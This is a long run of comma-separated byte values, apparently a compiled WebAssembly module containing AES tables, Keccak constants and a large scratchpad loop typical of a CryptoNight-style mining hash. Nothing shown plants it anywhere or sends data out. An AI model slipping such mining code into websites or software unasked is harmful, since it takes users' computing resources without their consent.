40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,144,131,128,1,106,34,8,40,2,0,32,13,16,18,32,0,65,224,129,128,1,106,33,16,32,0,65,240,129,128,1,106,33,17,32,0,65,128,130,128,1,106,33,18,32,0,65,144,130,128,1,106,33,19,32,0,65,160,130,128,1,106,33,20,32,0,65,176,130,128,1,106,33,21,32,0,65,192,130,128,1,106,33,22,65,0,33,1,3,64,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,16,32,8,40,2,0,40,2,0,40,2,12,16,9,32,17,32,8,40,2,0,40,2,0,40,2,12,16,9,32,18,32,8,40,2,0,40,2,0,40,2,12,16,9,32,19,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,6,32,4,41,0,0,55,0,0,32,6,32,4,41,0,8,55,0,8,32,6,32,4,41,0,16,55,0,16,32,6,32,4,41,0,24,55,0,24,32,6,32,4,41,0,32,55,0,32,32,6,32,4,41,0,40,55,0,40,32,6,32,4,41,0,48,55,0,48,32,6,32,4,41,0,56,55,0,56,32,6,32,4,41,0,64,55,0,64,32,6,32,4,41,0,72,55,0,72,32,6,32,4,41,0,80,55,0,80,32,6,32,4,41,0,88,55,0,88,32,6,32,4,41,0,96,55,0,96,32,6,32,4,41,0,104,55,0,104,32,6,32,4,41,0,112,55,0,112,32,6,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,0,65,208,130,128,1,106,34,6,32,0,65,160,128,128,1,106,34,23,41,3,0,32,13,41,3,0,133,34,25,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,10,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,11,32,0,65,136,131,128,1,106,33,15,65,0,33,1,32,25,167,33,9,3,64,32,0,32,9,65,240,255,255,0,113,106,34,9,32,11,32,6,16,20,32,9,32,10,41,3,0,32,11,41,3,0,133,55,3,0,32,9,32,14,41,3,0,32,15,41,3,0,133,55,3,8,32,11,41,3,0,34,26,66,32,136,33,25,32,0,32,11,40,2,0,65,240,255,255,0,113,106,34,9,41,3,0,34,28,66,32,136,34,29,32,26,66,255,255,255,255,15,131,34,24,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,24,126,33,24,32,26,32,27,32,25,126,124,32,24,66,32,136,124,34,27,66,32,134,32,24,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,24,32,6,32,6,41,3,0,32,29,32,25,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,25,32,28,133,55,3,0,32,12,32,24,32,9,65,8,106,34,7,41,3,0,133,55,3,0,32,9,32,25,55,3,0,32,7,32,24,55,3,0,32,0,32,6,40,2,0,65,240,255,255,0,113,106,34,9,32,10,32,6,16,20,32,9,32,11,41,3,0,32,10,41,3,0,133,55,3,0,32,9,32,15,41,3,0,32,14,41,3,0,133,55,3,8,32,10,41,3,0,34,26,66,32,136,33,25,32,0,32,10,40,2,0,65,240,255,255,0,113,106,34,9,41,3,0,34,28,66,32,136,34,29,32,26,66,255,255,255,255,15,131,34,24,126,33,26,32,28,66,255,255,255,255,15,131,34,27,32,24,126,33,24,32,26,32,27,32,25,126,124,32,24,66,32,136,124,34,27,66,32,134,32,24,66,255,255,255,255,15,131,132,32,12,41,3,0,124,33,24,32,6,32,6,41,3,0,32,29,32,25,126,124,32,27,66,32,136,124,32,27,32,26,84,173,66,32,134,124,34,25,32,28,133,55,3,0,32,12,32,24,32,9,65,8,106,34,7,41,3,0,133,55,3,0,32,9,32,25,55,3,0,32,7,32,24,55,3,0,32,1,65,1,106,34,1,65,128,128,16,71,4,64,32,6,40,2,0,33,9,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,8,40,2,0,32,23,16,18,32,0,65,216,129,128,1,106,33,6,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,11,32,0,65,136,130,128,1,106,33,12,32,0,65,152,130,128,1,106,33,14,32,0,65,168,130,128,1,106,33,15,32,0,65,184,130,128,1,106,33,9,32,0,65,200,130,128,1,106,33,23,65,0,33,1,3,64,32,4,32,4,41,3,0,32,0,32,1,106,34,7,41,3,0,133,55,3,0,32,6,32,6,41,3,0,32,7,41,3,8,133,55,3,0,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,16,32,16,41,3,0,32,0,32,1,65,16,114,106,34,7,41,3,0,133,55,3,0,32,10,32,10,41,3,0,32,7,41,3,8,133,55,3,0,32,16,32,8,40,2,0,40,2,0,40,2,12,16,9,32,17,32,17,41,3,0,32,0,32,1,65,32,114,106,34,7,41,3,0,133,55,3,0,32,11,32,11,41,3,0,32,7,41,3,8,133,55,3,0,32,17,32,8,40,2,0,40,2,0,40,2,12,16,9,32,18,32,18,41,3,0,32,0,32,1,65,48,114,106,34,7,41,3,0,133,55,3,0,32,12,32,12,41,3,0,32,7,41,3,8,133,55,3,0,32,18,32,8,40,2,0,40,2,0,40,2,12,16,9,32,19,32,19,41,3,0,32,0,32,1,65,192,0,114,106,34,7,41,3,0,133,55,3,0,32,14,32,14,41,3,0,32,7,41,3,8,133,55,3,0,32,19,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,20,41,3,0,32,0,32,1,65,208,0,114,106,34,7,41,3,0,133,55,3,0,32,15,32,15,41,3,0,32,7,41,3,8,133,55,3,0,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,21,41,3,0,32,0,32,1,65,224,0,114,106,34,7,41,3,0,133,55,3,0,32,9,32,9,41,3,0,32,7,41,3,8,133,55,3,0,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,22,41,3,0,32,0,32,1,65,240,0,114,106,34,7,41,3,0,133,55,3,0,32,23,32,23,41,3,0,32,7,41,3,8,133,55,3,0,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,5,32,4,41,3,0,55,3,0,32,5,32,4,41,3,8,55,3,8,32,5,32,4,41,3,16,55,3,16,32,5,32,4,41,3,24,55,3,24,32,5,32,4,41,3,32,55,3,32,32,5,32,4,41,3,40,55,3,40,32,5,32,4,41,3,48,55,3,48,32,5,32,4,41,3,56,55,3,56,32,5,32,4,41,3,64,55,3,64,32,5,32,4,41,3,72,55,3,72,32,5,32,4,41,3,80,55,3,80,32,5,32,4,41,3,88,55,3,88,32,5,32,4,41,3,96,55,3,96,32,5,32,4,41,3,104,55,3,104,32,5,32,4,41,3,112,55,3,112,32,5,32,4,41,3,120,55,3,120,32,13,16,19,32,13,65,200,1,32,2,32,13,44,0,0,65,3,113,65,2,116,65,128,42,106,40,2,0,65,7,113,17,0,0,32,3,36,4,11,27,1,1,127,35,4,33,1,35,4,32,0,106,36,4,35,4,65,15,106,65,112,113,36,4,32,1,11,11,201,67,3,0,65,128,8,11,224,39,198,99,99,165,248,124,124,132,238,119,119,153,246,123,123,141,255,242,242,13,214,107,107,189,222,111,111,177,145,197,197,84,96,48,48,80,2,1,1,3,206,103,103,169,86,43,43,125,231,254,254,25,181,215,215,98,77,171,171,230,236,118,118,154,143,202,202,69,31,130,130,157,137,201,201,64,250,125,125,135,239,250,250,21,178,89,89,235,142,71,71,201,251,240,240,11,65,173,173,236,179,212,212,103,95,162,162,253,69,175,175,234,35,156,156,191,83,164,164,247,228,114,114,150,155,192,192,91,117,183,183,194,225,253,253,28,61,147,147,174,76,38,38,106,108,54,54,90,126,63,63,65,245,247,247,2,131,204,204,79,104,52,52,92,81,165,165,244,209,229,229,52,249,241,241,8,226,113,113,147,171,216,216,115,98,49,49,83,42,21,21,63,8,4,4,12,149,199,199,82,70,35,35,101,157,195,195,94,48,24,24,40,55,150,150,161,10,5,5,15,47,154,154,181,14,7,7,9,36,18,18,54,27,128,128,155,223,226,226,61,205,235,235,38,78,39,39,105,127,178,178,205,234,117,117,159,18,9,9,27,29,131,131,158,88,44,44,116,52,26,26,46,54,27,27,45,220,110,110,178,180,90,90,238,91,160,160,251,164,82,82,246,118,59,59,77,183,214,214,97,125,179,179,206,82,41,41,123,221,227,227,62,94,47,47,113,19,132,132,151,166,83,83,245,185,209,209,104,0,0,0,0,193,237,237,44,64,32,32,96,227,252,252,31,121,177,177,200,182,91,91,237,212,106,106,190,141,203,203,70,103,190,190,217,114,57,57,75,148,74,74,222,152,76,76,212,176,88,88,232,133,207,207,74,187,208,208,107,197,239,239,42,79,170,170,229,237,251,251,22,134,67,67,197,154,77,77,215,102,51,51,85,17,133,133,148,138,69,69,207,233,249,249,16,4,2,2,6,254,127,127,129,160,80,80,240,120,60,60,68,37,159,159,186,75,168,168,227,162,81,81,243,93,163,163,254,128,64,64,192,5,143,143,138,63,146,146,173,33,157,157,188,112,56,56,72,241,245,245,4,99,188,188,223,119,182,182,193,175,218,218,117,66,33,33,99,32,16,16,48,229,255,255,26,253,243,243,14,191,210,210,109,129,205,205,76,24,12,12,20,38,19,19,53,195,236,236,47,190,95,95,225,53,151,151,162,136,68,68,204,46,23,23,57,147,196,196,87,85,167,167,242,252,126,126,130,122,61,61,71,200,100,100,172,186,93,93,231,50,25,25,43,230,115,115,149,192,96,96,160,25,129,129,152,158,79,79,209,163,220,220,127,68,34,34,102,84,42,42,126,59,144,144,171,11,136,136,131,140,70,70,202,199,238,238,41,107,184,184,211,40,20,20,60,167,222,222,121,188,94,94,226,22,11,11,29,173,219,219,118,219,224,224,59,100,50,50,86,116,58,58,78,20,10,10,30,146,73,73,219,12,6,6,10,72,36,36,108,184,92,92,228,159,194,194,93,189,211,211,110,67,172,172,239,196,98,98,166,57,145,145,168,49,149,149,164,211,228,228,55,242,121,121,139,213,231,231,50,139,200,200,67,110,55,55,89,218,109,109,183,1,141,141,140,177,213,213,100,156,78,78,210,73,169,169,224,216,108,108,180,172,86,86,250,243,244,244,7,207,234,234,37,202,101,101,175,244,122,122,142,71,174,174,233,16,8,8,24,111,186,186,213,240,120,120,136,74,37,37,111,92,46,46,114,56,28,28,36,87,166,166,241,115,180,180,199,151,198,198,81,203,232,232,35,161,221,221,124,232,116,116,156,62,31,31,33,150,75,75,221,97,189,189,220,13,139,139,134,15,138,138,133,224,112,112,144,124,62,62,66,113,181,181,196,204,102,102,170,144,72,72,216,6,3,3,5,247,246,246,1,28,14,14,18,194,97,97,163,106,53,53,95,174,87,87,249,105,185,185,208,23,134,134,145,153,193,193,88,58,29,29,39,39,158,158,185,217,225,225,56,235,248,248,19,43,152,152,179,34,17,17,51,210,105,105,187,169,217,217,112,7,142,142,137,51,148,148,167,45,155,155,182,60,30,30,34,21,135,135,146,201,233,233,32,135,206,206,73,170,85,85,255,80,40,40,120,165,223,223,122,3,140,140,143,89,161,161,248,9,137,137,128,26,13,13,23,101,191,191,218,215,230,230,49,132,66,66,198,208,104,104,184,130,65,65,195,41,153,153,176,90,45,45,119,30,15,15,17,123,176,176,203,168,84,84,252,109,187,187,214,44,22,22,58,165,198,99,99,132,248,124,124,153,238,119,119,141,246,123,123,13,255,242,242,189,214,107,107,177,222,111,111,84,145,197,197,80,96,48,48,3,2,1,1,169,206,103,103,125,86,43,43,25,231,254,254,98,181,215,215,230,77,171,171,154,236,118,118,69,143,202,202,157,31,130,130,64,137,201,201,135,250,125,125,21,239,250,250,235,178,89,89,201,142,71,71,11,251,240,240,236,65,173,173,103,179,212,212,253,95,162,162,234,69,175,175,191,35,156,156,247,83,164,164,150,228,114,114,91,155,192,192,194,117,183,183,28,225,253,253,174,61,147,147,106,76,38,38,90,108,54,54,65,126,63,63,2,245,247,247,79,131,204,204,92,104,52,52,244,81,165,165,52,209,229,229,8,249,241,241,147,226,113,113,115,171,216,216,83,98,49,49,63,42,21,21,12,8,4,4,82,149,199,199,101,70,35,35,94,157,195,195,40,48,24,24,161,55,150,150,15,10,5,5,181,47,154,154,9,14,7,7,54,36,18,18,155,27,128,128,61,223,226,226,38,205,235,235,105,78,39,39,205,127,178,178,159,234,117,117,27,18,9,9,158,29,131,131,116,88,44,44,46,52,26,26,45,54,27,27,178,220,110,110,238,180,90,90,251,91,160,160,246,164,82,82,77,118,59,59,97,183,214,214,206,125,179,179,123,82,41,41,62,221,227,227,113,94,47,47,151,19,132,132,245,166,83,83,104,185,209,209,0,0,0,0,44,193,237,237,96,64,32,32,31,227,252,252,200,121,177,177,237,182,91,91,190,212,106,106,70,141,203,203,217,103,190,190,75,114,57,57,222,148,74,74,212,152,76,76,232,176,88,88,74,133,207,207,107,187,208,208,42,197,239,239,229,79,170,170,22,237,251,251,197,134,67,67,215,154,77,77,85,102,51,51,148,17,133,133,207,138,69,69,16,233,249,249,6,4,2,2,129,254,127,127,240,160,80,80,68,120,60,60,186,37,159,159,227,75,168,168,243,162,81,81,254,93,163,163,192,128,64,64,138,5,143,143,173,63,146,146,188,33,157,157,72,112,56,56,4,241,245,245,223,99,188,188,193,119,182,182,117,175,218,218,99,66,33,33,48,32,16,16,26,229,255,255,14,253,243,243,109,191,210,210,76,129,205,205,20,24,12,12,53,38,19,19,47,195,236,236,225,190,95,95,162,53,151,151,204,136,68,68,57,46,23,23,87,147,196,196,242,85,167,167,130,252,126,126,71,122,61,61,172,200,100,100,231,186,93,93,43,50,25,25,149,230,115,115,160,192,96,96,152,25,129,129,209,158,79,79,127,163,220,220,102,68,34,34,126,84,42,42,171,59,144,144,131,11,136,136,202,140,70,70,41,199,238,238,211,107,184,184,60,40,20,20,121,167,222,222,226,188,94,94,29,22,11,11,118,173,219,219,59,219,224,224,86,100,50,50,78,116,58,58,30,20,10,10,219,146,73,73,10,12,6,6,108,72,36,36,228,184,92,92,93,159,194,194,110,189,211,211,239,67,172,172,166,196,98,98,168,57,145,145,164,49,149,149,55,211,228,228,139,242,121,121,50,213,231,231,67,139,200,200,89,110,55,55,183,218,109,109,140,1,141,141,100,177,213,213,210,156,78,78,224,73,169,169,180,216,108,108,250,172,86,86,7,243,244,244,37,207,234,234,175,202,101,101,142,244,122,122,233,71,174,174,24,16,8,8,213,111,186,186,136,240,120,120,111,74,37,37,114,92,46,46,36,56,28,28,241,87,166,166,199,115,180,180,81,151,198,198,35,203,232,232,124,161,221,221,156,232,116,116,33,62,31,31,221,150,75,75,220,97,189,189,134,13,139,139,133,15,138,138,144,224,112,112,66,124,62,62,196,113,181,181,170,204,102,102,216,144,72,72,5,6,3,3,1,247,246,246,18,28,14,14,163,194,97,97,95,106,53,53,249,174,87,87,208,105,185,185,145,23,134,134,88,153,193,193,39,58,29,29,185,39,158,158,56,217,225,225,19,235,248,248,179,43,152,152,51,34,17,17,187,210,105,105,112,169,217,217,137,7,142,142,167,51,148,148,182,45,155,155,34,60,30,30,146,21,135,135,32,201,233,233,73,135,206,206,255,170,85,85,120,80,40,40,122,165,223,223,143,3,140,140,248,89,161,161,128,9,137,137,23,26,13,13,218,101,191,191,49,215,230,230,198,132,66,66,184,208,104,104,195,130,65,65,176,41,153,153,119,90,45,45,17,30,15,15,203,123,176,176,252,168,84,84,214,109,187,187,58,44,22,22,99,165,198,99,124,132,248,124,119,153,238,119,123,141,246,123,242,13,255,242,107,189,214,107,111,177,222,111,197,84,145,197,48,80,96,48,1,3,2,1,103,169,206,103,43,125,86,43,254,25,231,254,215,98,181,215,171,230,77,171,118,154,236,118,202,69,143,202,130,157,31,130,201,64,137,201,125,135,250,125,250,21,239,250,89,235,178,89,71,201,142,71,240,11,251,240,173,236,65,173,212,103,179,212,162,253,95,162,175,234,69,175,156,191,35,156,164,247,83,164,114,150,228,114,192,91,155,192,183,194,117,183,253,28,225,253,147,174,61,147,38,106,76,38,54,90,108,54,63,65,126,63,247,2,245,247,204,79,131,204,52,92,104,52,165,244,81,165,229,52,209,229,241,8,249,241,113,147,226,113,216,115,171,216,49,83,98,49,21,63,42,21,4,12,8,4,199,82,149,199,35,101,70,35,195,94,157,195,24,40,48,24,150,161,55,150,5,15,10,5,154,181,47,154,7,9,14,7,18,54,36,18,128,155,27,128,226,61,223,226,235,38,205,235,39,105,78,39,178,205,127,178,117,159,234,117,9,27,18,9,131,158,29,131,44,116,88,44,26,46,52,26,27,45,54,27,110,178,220,110,90,238,180,90,160,251,91,160,82,246,164,82,59,77,118,59,214,97,183,214,179,206,125,179,41,123,82,41,227,62,221,227,47,113,94,47,132,151,19,132,83,245,166,83,209,104,185,209,0,0,0,0,237,44,193,237,32,96,64,32,252,31,227,252,177,200,121,177,91,237,182,91,106,190,212,106,203,70,141,203,190,217,103,190,57,75,114,57,74,222,148,74,76,212,152,76,88,232,176,88,207,74,133,207,208,107,187,208,239,42,197,239,170,229,79,170,251,22,237,251,67,197,134,67,77,215,154,77,51,85,102,51,133,148,17,133,69,207,138,69,249,16,233,249,2,6,4,2,127,129,254,127,80,240,160,80,60,68,120,60,159,186,37,159,168,227,75,168,81,243,162,81,163,254,93,163,64,192,128,64,143,138,5,143,146,173,63,146,157,188,33,157,56,72,112,56,245,4,241,245,188,223,99,188,182,193,119,182,218,117,175,218,33,99,66,33,16,48,32,16,255,26,229,255,243,14,253,243,210,109,191,210,205,76,129,205,12,20,24,12,19,53,38,19,236,47,195,236,95,225,190,95,151,162,53,151,68,204,136,68,23,57,46,23,196,87,147,196,167,242,85,167,126,130,252,126,61,71,122,61,100,172,200,100,93,231,186,93,25,43,50,25,115,149,230,115,96,160,192,96,129,152,25,129,79,209,158,79,220,127,163,220,34,102,68,34,42,126,84,42,144,171,59,144,136,131,11,136,70,202,140,70,238,41,199,238,184,211,107,184,20,60,40,20,222,121,167,222,94,226,188,94,11,29,22,11,219,118,173,219,224,59,219,224,50,86,100,50,58,78,116,58,10,30,20,10,73,219,146,73,6,10,12,6,36,108,72,36,92,228,184,92,194,93,159,194,211,110,189,211,172,239,67,172,98,166,196,98,145,168,57,145,149,164,49,149,228,55,211,228,121,139,242,121,231,50,213,231,200,67,139,200,55,89,110,55,109,183,218,109,141,140,1,141,213,100,177,213,78,210,156,78,169,224,73,169,108,180,216,108,86,250,172,86,244,7,243,244,234,37,207,234,101,175,202,101,122,142,244,122,174,233,71,174,8,24,16,8,186,213,111,186,120,136,240,120,37,111,74,37,46,114,92,46,28,36,56,28,166,241,87,166,180,199,115,180,198,81,151,198,232,35,203,232,221,124,161,221,116,156,232,116,31,33,62,31,75,221,150,75,189,220,97,189,139,134,13,139,138,133,15,138,112,144,224,112,62,66,124,62,181,196,113,181,102,170,204,102,72,216,144,72,3,5,6,3,246,1,247,246,14,18,28,14,97,163,194,97,53,95,106,53,87,249,174,87,185,208,105,185,134,145,23,134,193,88,153,193,29,39,58,29,158,185,39,158,225,56,217,225,248,19,235,248,152,179,43,152,17,51,34,17,105,187,210,105,217,112,169,217,142,137,7,142,148,167,51,148,155,182,45,155,30,34,60,30,135,146,21,135,233,32,201,233,206,73,135,206,85,255,170,85,40,120,80,40,223,122,165,223,140,143,3,140,161,248,89,161,137,128,9,137,13,23,26,13,191,218,101,191,230,49,215,230,66,198,132,66,104,184,208,104,65,195,130,65,153,176,41,153,45,119,90,45,15,17,30,15,176,203,123,176,84,252,168,84,187,214,109,187,22,58,44,22,99,99,165,198,124,124,132,248,119,119,153,238,123,123,141,246,242,242,13,255,107,107,189,214,111,111,177,222,197,197,84,145,48,48,80,96,1,1,3,2,103,103,169,206,43,43,125,86,254,254,25,231,215,215,98,181,171,171,230,77,118,118,154,236,202,202,69,143,130,130,157,31,201,201,64,137,125,125,135,250,250,250,21,239,89,89,235,178,71,71,201,142,240,240,11,251,173,173,236,65,212,212,103,179,162,162,253,95,175,175,234,69,156,156,191,35,164,164,247,83,114,114,150,228,192,192,91,155,183,183,194,117,253,253,28,225,147,147,174,61,38,38,106,76,54,54,90,108,63,63,65,126,247,247,2,245,204,204,79,131,52,52,92,104,165,165,244,81,229,229,52,209,241,241,8,249,113,113,147,226,216,216,115,171,49,49,83,98,21,21,63,42,4,4,12,8,199,199,82,149,35,35,101,70,195,195,94,157,24,24,40,48,150,150,161,55,5,5,15,10,154,154,181,47,7,7,9,14,18,18,54,36,128,128,155,27,226,226,61,223,235,235,38,205,39,39,105,78,178,178,205,127,117,117,159,234,9,9,27,18,131,131,158,29,44,44,116,88,26,26,46,52,27,27,45,54,110,110,178,220,90,90,238,180,160,160,251,91,82,82,246,164,59,59,77,118,214,214,97,183,179,179,206,125,41,41,123,82,227,227,62,221,47,47,113,94,132,132,151,19,83,83,245,166,209,209,104,185,0,0,0,0,237,237,44,193,32,32,96,64,252,252,31,227,177,177,200,121,91,91,237,182,106,106,190,212,203,203,70,141,190,190,217,103,57,57,75,114,74,74,222,148,76,76,212,152,88,88,232,176,207,207,74,133,208,208,107,187,239,239,42,197,170,170,229,79,251,251,22,237,67,67,197,134,77,77,215,154,51,51,85,102,133,133,148,17,69,69,207,138,249,249,16,233,2,2,6,4,127,127,129,254,80,80,240,160,60,60,68,120,159,159,186,37,168,168,227,75,81,81,243,162,163,163,254,93,64,64,192,128,143,143,138,5,146,146,173,63,157,157,188,33,56,56,72,112,245,245,4,241,188,188,223,99,182,182,193,119,218,218,117,175,33,33,99,66,16,16,48,32,255,255,26,229,243,243,14,253,210,210,109,191,205,205,76,129,12,12,20,24,19,19,53,38,236,236,47,195,95,95,225,190,151,151,162,53,68,68,204,136,23,23,57,46,196,196,87,147,167,167,242,85,126,126,130,252,61,61,71,122,100,100,172,200,93,93,231,186,25,25,43,50,115,115,149,230,96,96,160,192,129,129,152,25,79,79,209,158,220,220,127,163,34,34,102,68,42,42,126,84,144,144,171,59,136,136,131,11,70,70,202,140,238,238,41,199,184,184,211,107,20,20,60,40,222,222,121,167,94,94,226,188,11,11,29,22,219,219,118,173,224,224,59,219,50,50,86,100,58,58,78,116,10,10,30,20,73,73,219,146,6,6,10,12,36,36,108,72,92,92,228,184,194,194,93,159,211,211,110,189,172,172,239,67,98,98,166,196,145,145,168,57,149,149,164,49,228,228,55,211,121,121,139,242,231,231,50,213,200,200,67,139,55,55,89,110,109,109,183,218,141,141,140,1,213,213,100,177,78,78,210,156,169,169,224,73,108,108,180,216,86,86,250,172,244,244,7,243,234,234,37,207,101,101,175,202,122,122,142,244,174,174,233,71,8,8,24,16,186,186,213,111,120,120,136,240,37,37,111,74,46,46,114,92,28,28,36,56,166,166,241,87,180,180,199,115,198,198,81,151,232,232,35,203,221,221,124,161,116,116,156,232,31,31,33,62,75,75,221,150,189,189,220,97,139,139,134,13,138,138,133,15,112,112,144,224,62,62,66,124,181,181,196,113,102,102,170,204,72,72,216,144,3,3,5,6,246,246,1,247,14,14,18,28,97,97,163,194,53,53,95,106,87,87,249,174,185,185,208,105,134,134,145,23,193,193,88,153,29,29,39,58,158,158,185,39,225,225,56,217,248,248,19,235,152,152,179,43,17,17,51,34,105,105,187,210,217,217,112,169,142,142,137,7,148,148,167,51,155,155,182,45,30,30,34,60,135,135,146,21,233,233,32,201,206,206,73,135,85,85,255,170,40,40,120,80,223,223,122,165,140,140,143,3,161,161,248,89,137,137,128,9,13,13,23,26,191,191,218,101,230,230,49,215,66,66,198,132,104,104,184,208,65,65,195,130,153,153,176,41,45,45,119,90,15,15,17,30,176,176,203,123,84,84,252,168,187,187,214,109,22,22,58,44,1,0,0,0,0,0,0,0,130,128,0,0,0,0,0,0,138,128,0,0,0,0,0,128,0,128,0,128,0,0,0,128,139,128,0,0,0,0,0,0,1,0,0,128,0,0,0,0,129,128,0,128,0,0,0,128,9,128,0,0,0,0,0,128,138,0,0,0,0,0,0,0,136,0,0,0,0,0,0,0,9,128,0,128,0,0,0,0,10,0,0,128,0,0,0,0,139,128,0,128,0,0,0,0,139,0,0,0,0,0,0,128,137,128,0,0,0,0,0,128,3,128,0,0,0,0,0,128,2,128,0,0,0,0,0,128,128,0,0,0,0,0,0,128,10,128,0,0,0,0,0,0,10,0,0,128,0,0,0,128,129,128,0,128,0,0,0,128,128,128,0,0,0,0,0,128,1,0,0,128,0,0,0,0,8,128,0,128,0,0,0,128,19,62,219,47,161,68,208,204,235,169,121,26,48,144,53,232,111,110,129,79,97,160,174,85,219,148,155,174,164,103,39,42,131,118,221,116,94,2,6,236,81,98,116,196,205,54,164,231,133,209,58,57,249,186,111,195,19,252,237,51,24,186,237,62,1,0,0,0,2,0,0,0,3,0,0,0,4,0,0,0,136,106,63,36,211,8,163,133,46,138,25,19,68,115,112,3,34,56,9,164,208,49,159,41,152,250,46,8,137,108,78,236,230,33,40,69,119,19,208,56,207,102,84,190,108,12,233,52,183,41,172,192,221,80,124,201,181,213,132,63,23,9,71,181,198,50,244,165,244,151,165,198,248,111,151,132,151,235,132,248,238,94,176,153,176,199,153,238,246,122,140,141,140,247,141,246,255,232,23,13,23,229,13,255,214,10,220,189,220,183,189,214,222,22,200,177,200,167,177,222,145,109,252,84,252,57,84,145,96,144,240,80,240,192,80,96,2,7,5,3,5,4,3,2,206,46,224,169,224,135,169,206,86,209,135,125,135,172,125,86,231,204,43,25,43,213,25,231,181,19,166,98,166,113,98,181,77,124,49,230,49,154,230,77,236,89,181,154,181,195,154,236,143,64,207,69,207,5,69,143,31,163,188,157,188,62,157,31,137,73,192,64,192,9,64,137,250,104,146,135,146,239,135,250,239,208,63,21,63,197,21,239,178,148,38,235,38,127,235,178,142,206,64,201,64,7,201,142,251,230,29,11,29,237,11,251,65,110,47,236,47,130,236,65,179,26,169,103,169,125,103,179,95,67,28,253,28,190,253,95,69,96,37,234,37,138,234,69,35,249,218,191,218,70,191,35,83,81,2,247,2,166,247,83,228,69,161,150,161,211,150,228,155,118,237,91,237,45,91,155,117,40,93,194,93,234,194,117,225,197,36,28,36,217,28,225,61,212,233,174,233,122,174,61,76,242,190,106,190,152,106,76,108,130,238,90,238,216,90,108,126,189,195,65,195,252,65,126,245,243,6,2,6,241,2,245,131,82,209,79,209,29,79,131,104,140,228,92,228,208,92,104,81,86,7,244,7,162,244,81,209,141,92,52,92,185,52,209,249,225,24,8,24,233,8,249,226,76,174,147,174,223,147,226,171,62,149,115,149,77,115,171,98,151,245,83,245,196,83,98,42,107,65,63,65,84,63,42,8,28,20,12,20,16,12,8,149,99,246,82,246,49,82,149,70,233,175,101,175,140,101,70,157,127,226,94,226,33,94,157,48,72,120,40,120,96,40,48,55,207,248,161,248,110,161,55,10,27,17,15,17,20,15,10,47,235,196,181,196,94,181,47,14,21,27,9,27,28,9,14,36,126,90,54,90,72,54,36,27,173,182,155,182,54,155,27,223,152,71,61,71,165,61,223,205,167,106,38,106,129,38,205,78,245,187,105,187,156,105,78,127,51,76,205,76,254,205,127,234,80,186,159,186,207,159,234,18,63,45,27,45,36,27,18,29,164,185,158,185,58,158,29,88,196,156,116,156,176,116,88,52,70,114,46,114,104,46,52,54,65,119,45,119,108,45,54,220,17,205,178,205,163,178,220,180,157,41,238,41,115,238,180,91,77,22,251,22,182,251,91,164,165,1,246,1,83,246,164,118,161,215,77,215,236,77,118,183,20,163,97,163,117,97,183,125,52,73,206,73,250,206,125,82,223,141,123,141,164,123,82,221,159,66,62,66,161,62,221,94,205,147,113,147,188,113,94,19,177,162,151,162,38,151,19,166,162,4,245,4,87,245,166,185,1,184,104,184,105,104,185,0,65,232,47,11,137,14,193,181,116,44,116,153,44,193,64,224,160,96,160,128,96,64,227,194,33,31,33,221,31,227,121,58,67,200,67,242,200,121,182,154,44,237,44,119,237,182,212,13,217,190,217,179,190,212,141,71,202,70,202,1,70,141,103,23,112,217,112,206,217,103,114,175,221,75,221,228,75,114,148,237,121,222,121,51,222,148,152,255,103,212,103,43,212,152,176,147,35,232,35,123,232,176,133,91,222,74,222,17,74,133,187,6,189,107,189,109,107,187,197,187,126,42,126,145,42,197,79,123,52,229,52,158,229,79,237,215,58,22,58,193,22,237,134,210,84,197,84,23,197,134,154,248,98,215,98,47,215,154,102,153,255,85,255,204,85,102,17,182,167,148,167,34,148,17,138,192,74,207,74,15,207,138,233,217,48,16,48,201,16,233,4,14,10,6,10,8,6,4,254,102,152,129,152,231,129,254,160,171,11,240,11,91,240,160,120,180,204,68,204,240,68,120,37,240,213,186,213,74,186,37,75,117,62,227,62,150,227,75,162,172,14,243,14,95,243,162,93,68,25,254,25,186,254,93,128,219,91,192,91,27,192,128,5,128,133,138,133,10,138,5,63,211,236,173,236,126,173,63,33,254,223,188,223,66,188,33,112,168,216,72,216,224,72,112,241,253,12,4,12,249,4,241,99,25,122,223,122,198,223,99,119,47,